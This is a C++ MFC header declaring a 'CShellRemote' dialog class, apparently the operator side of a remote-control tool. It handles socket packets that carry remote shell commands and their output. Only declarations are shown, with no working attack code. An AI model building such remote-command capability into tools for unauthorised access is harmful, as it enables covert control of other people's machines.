﻿#pragma once

#include "ClientManage.h"
#include "ModuleManage.h"


#define COMMAND_RESULT_BUFFER_LENGTH 8096



// CShellRemote 对话框

class CShellRemote : public CDialogEx, public CModule
{
	DECLARE_DYNAMIC(CShellRemote)

public:
	CShellRemote(CWnd* pParent = nullptr, CSocketClient* pClient = nullptr);   // 标准构造函数
	virtual ~CShellRemote();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG2 };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()


public:
	//CClient*		m_pClient;			基类有这个成员了


	DWORD			m_dwBufferTail;
	WCHAR			m_pszWideChar[COMMAND_RESULT_BUFFER_LENGTH+1];

	CToolTipCtrl	m_MyTip;		// 提示框


public:
	// 重写虚函数
	void OnRecvChildSocketClientPacket(CPacket* pPacket);

	void OnOK();
	BOOL PreTranslateMessage(MSG* pMsg);
	void OnClose();
	BOOL OnInitDialog();

public:
	VOID OnRecvPacketShellRemoteExecute(CPacket* pPacket);

public:
	afx_msg void OnEnChangeEdit1();

	CEdit m_EditResult;
	CEdit m_EditCommand;
	afx_msg void OnBnClickedButton1();
};